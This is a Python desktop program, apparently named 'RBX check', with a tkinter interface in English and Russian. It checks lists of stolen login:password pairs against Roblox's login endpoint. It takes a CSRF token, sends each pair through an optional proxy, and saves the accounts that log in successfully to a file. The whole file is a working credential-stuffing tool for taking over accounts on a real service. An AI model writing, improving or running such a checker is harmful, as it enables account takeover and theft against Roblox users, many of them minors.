import os
import tkinter as tk
from tkinter import filedialog, messagebox
import requests
import config
import threading
from queue import Queue

def load_config():
    global proxy, accounts_file_path, output_file_path
    proxy = config.proxy
    accounts_file_path = config.accounts_file_path
    output_file_path = config.output_file_path

def save_config():
    with open('config.py', 'w', encoding='utf-8') as f:
        f.write(f'proxy = "{proxy}"\n')
        f.write(f'accounts_file_path = "{accounts_file_path}"\n')
        f.write(f'output_file_path = "{output_file_path}"\n')

def browse_accounts_file():
    global accounts_file_path
    accounts_file_path = filedialog.askopenfilename()
    if accounts_file_path:
        accounts_path_entry.delete(0, tk.END)
        accounts_path_entry.insert(0, accounts_file_path)

def browse_output_file():
    global output_file_path
    output_file_path = filedialog.asksaveasfilename(defaultextension=".txt")
    if output_file_path:
        output_path_entry.delete(0, tk.END)
        output_path_entry.insert(0, output_file_path)

def switch_language():
    global lang
    lang = language_var.get()
    update_labels()

def update_labels():
    if lang == "EN":
        app.title("RBX check")
        language_label.config(text="Language")
        accounts_label.config(text="Accounts path")
        proxy_label.config(text="Proxy")
        output_label.config(text="Output")
        start_button.config(text="Start")
        browse_accounts_button.config(text="Browse")
        browse_output_button.config(text="Browse")
    else:
        app.title("RBX check")
        language_label.config(text="Язык")
        accounts_label.config(text='''Путь к файлу
с аккаунтами''')
        proxy_label.config(text="Прокси")
        output_label.config(text='''Путь для файла 
с рабочими аккаунтами''')
        start_button.config(text="Начать проверку")
        browse_accounts_button.config(text="Обзор")
        browse_output_button.config(text="Обзор")

def start_checking():
    check_thread = threading.Thread(target=check_accounts)
    check_thread.start()

def check_accounts():
    global proxy, accounts_file_path, output_file_path

    if not accounts_file_path:
        log_queue.put("Error: accounts file not selected." if lang == "EN" else "Ошибка: файл с аккаунтами не выбран.")
        return

    if not output_file_path:
        log_queue.put("Error: output file not selected." if lang == "EN" else "Ошибка: файл для сохранения рабочих аккаунтов не выбран.")
        return

    proxy = proxy_entry.get()
    save_config()

    with open(accounts_file_path, "r", encoding='utf-8') as file:
        accounts = file.readlines()
    
    working_accounts = []
    session = requests.Session()
    csrf_token = get_csrf_token(session, proxy)
    
    if not csrf_token:
        log_queue.put("Failed to retrieve CSRF token." if lang == "EN" else "Не удалось получить CSRF токен.")
        return

    for account in accounts:
        login, password = account.strip().split(":")
        payload = {
            "ctype": "Username",
            "cvalue": login,
            "password": password
        }
        headers = {
            "X-CSRF-Token": csrf_token
        }
        try:
            response = session.post("https://auth.roblox.com/v2/login", json=payload, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None)
            if response.status_code == 200:
                working_accounts.append(f"{login}:{password}")
                log_queue.put(f"Account {login} is working." if lang == "EN" else f"Аккаунт {login} работает.")
            else:
                log_queue.put(f"Account {login} failed. Error: {response.text}" if lang == "EN" else f"Аккаунт {login} не работает. Ошибка: {response.text}")
        except Exception as e:
            log_queue.put(f"Error checking account {login}: {e}" if lang == "EN" else f"Ошибка проверки аккаунта {login}: {e}")
    
    with open(output_file_path, "w", encoding='utf-8') as file:
        for account in working_accounts:
            file.write(account + "\n")

def get_csrf_token(session, proxy):
    try:
        response = session.post("https://auth.roblox.com/v2/login", proxies={"http": proxy, "https": proxy} if proxy else None)
        if response.status_code == 403:
            return response.headers["X-CSRF-Token"]
        else:
            log_queue.put(f"Failed to retrieve CSRF token. Status code: {response.status_code}" if lang == "EN" else f"Не удалось получить CSRF токен. Код состояния: {response.status_code}")
            return None
    except Exception as e:
        log_queue.put(f"Error retrieving CSRF token: {e}" if lang == "EN" else f"Ошибка получения CSRF токена: {e}")
        return None

def log(message):
    log_text.insert(tk.END, message + "\n")
    log_text.see(tk.END)

def process_log_queue():
    while not log_queue.empty():
        message = log_queue.get_nowait()
        log(message)
    app.after(100, process_log_queue)

app = tk.Tk()

language_var = tk.StringVar(value="EN")
lang = "EN"

log_queue = Queue()
load_config()

tk.Label(app, text="Language", name="language_label").grid(row=0, column=0)
language_label = app.children["language_label"]
language_option_menu = tk.OptionMenu(app, language_var, "EN", "RU", command=lambda _: switch_language())
language_option_menu.grid(row=0, column=1)

tk.Label(app, text="Accounts path", name="accounts_label").grid(row=1, column=0)
accounts_label = app.children["accounts_label"]
accounts_path_entry = tk.Entry(app, width=50)
accounts_path_entry.grid(row=1, column=1)
browse_accounts_button = tk.Button(app, text="Browse", command=browse_accounts_file)
browse_accounts_button.grid(row=1, column=2)

tk.Label(app, text="Proxy", name="proxy_label").grid(row=2, column=0)
proxy_label = app.children["proxy_label"]
proxy_entry = tk.Entry(app, width=50)
proxy_entry.insert(0, proxy)
proxy_entry.grid(row=2, column=1)

tk.Label(app, text="Output path", name="output_label").grid(row=3, column=0)
output_label = app.children["output_label"]
output_path_entry = tk.Entry(app, width=50)
output_path_entry.grid(row=3, column=1)
browse_output_button = tk.Button(app, text="Browse", command=browse_output_file)
browse_output_button.grid(row=3, column=2)

start_button = tk.Button(app, text="Start", command=start_checking)
start_button.grid(row=4, column=0, columnspan=3)

log_text = tk.Text(app, height=10, width=70)
log_text.grid(row=5, column=0, columnspan=3)

update_labels()

app.after(100, process_log_queue)
app.mainloop()